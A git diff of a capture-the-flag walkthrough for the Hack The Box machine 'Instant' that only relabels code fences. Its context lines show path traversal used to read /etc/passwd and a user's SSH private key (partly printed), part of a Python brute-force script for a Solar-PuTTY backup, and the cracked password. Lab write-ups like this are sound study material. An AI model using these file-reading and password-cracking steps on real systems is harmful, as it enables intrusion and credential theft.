@@ -42,25 +42,25 @@ From the nmap results, we can see that there is port 80 which is a web service t
 
 First of all, we can add the IP to our `/etc/host` folder as `instant.htb`
 
-```shell
+```console
 kali@kali$ sudo nano /etc/host
 10.10.11.37 instant.htb
 ```
 
 Take a look in the website, and i can get an ```.apk``` file, download it and use jadx to convert to java code.
 
-```jadx
+```console
 jadx -d /home/kali/htb/machine/instant/out /home/kali/htb/machine/instant/instant.apk
 ```
 
 And find grep ```instant.htb``` to get some information
 
-```grep
+```console
 grep -r instant.htb
 ```
 Result of grep command is
 
-```grep
+```console
 gobuster:/css                  (Status: 301) [Size: 308] [--> http://instant.htb/css/]
 gobuster:/downloads            (Status: 301) [Size: 314] [--> http://instant.htb/downloads/]
 gobuster:/img                  (Status: 301) [Size: 308] [--> http://instant.htb/img/]
@@ -92,7 +92,9 @@ First we get ```/etc/passwd```, so we get username of user account is ```shirohi
 
 Second, we get key ssh of shirohige by path ```../.ssh/id_rsa``` so now we have a foothold in system
 
-```id_rsa
+![image]()
+
+```console
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAYEApbntlalmnZWcTVZ0skIN2+Ppqr4xjYgIrZyZzd9YtJGuv/w3GW8B
@@ -143,7 +145,7 @@ Second, in the ```sessions-backup.dat```, search for decrypting the session encr
 
 Download and write a python file to brute force password in solar putty with rockyou dictionary
 
-```bruteforce.py
+```python
 import subprocess
 import os
 passdata = "rockyou.txt"
@@ -163,7 +165,7 @@ with open(passdata, 'rb') as f:
 ```
 So we can get the password is ```estrella``` and data in ```session-backup.dat``` after decrypting is
 
-```session-backup.dat
+```console
 {
   "Sessions": [
     {
